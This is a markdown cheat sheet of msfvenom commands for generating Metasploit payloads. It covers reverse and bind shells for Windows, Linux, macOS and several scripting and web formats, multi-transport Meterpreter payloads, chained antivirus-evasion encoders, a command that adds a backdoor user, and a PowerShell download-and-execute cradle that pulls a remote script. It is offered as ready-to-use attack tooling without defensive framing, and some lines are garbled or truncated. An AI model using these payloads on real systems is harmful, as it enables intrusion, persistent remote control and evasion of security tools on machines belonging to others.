# msfvenom

## reverse all port payload

```
msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.56.1 lport=6969  --platform windows exitfunc=thread -a x86  -f exe >reverse_all.exe

set payload windows/meterpreter/reverse_tcp_allports
```

lport is the starting port which can also be set to 1 so it will go all the way to 65535 in both payload and the

## multi-transport payload

in AddTransports.ps1 :

```
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url https://<host>:<port>;-RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http://<host>:<port>;-RetryWait 10 -RetryTotal 30
```

The command line for this would be:

```
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

## custom payload

​​this is a chained command -- enter it one line at a time

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/fnstenv_mov -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.234 LPORT=443 R | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -t exe -c --platform windows /usr/share/windows-binaries/plink.exe -o beffany.exe

```

## Linux

Linux Meterpreter reverse shell x86 multi stage

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf 
```

Linux Meterpreter bind shell x86 multi stage

```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf 
```

Linux bind shell x64 single stage

```
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf 	
```

Linux reverse shell x64 single stage

```
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf 
```

## Windows

Windows Meterpreter reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows Meterpreter http reverse shell

```
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```

Windows Meterpreter bind shell

```
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
```

Windows CMD Multi Stage

```
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows CMD Single Stage

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe >
```

Windows add user

```
 shell.exemsfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

Windows Exec Nishang Powershell in python

```
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
```

Bad characters shikata\_ga\_nai

```
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```

Bad characters fnstenv\_mov

```
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

## MAC

Mac Reverse Shell

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
```

Mac Bind shell

```
msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho
```

## Other Languages

python

```
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
```

BASH Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh
```

PERL Shell

```
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl
```

ASP Meterpreter shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
```

JSP Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
```

​WAR Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
```

​pbcopy && echo '?php '

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php
```

Php Reverse Shell

```
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
```
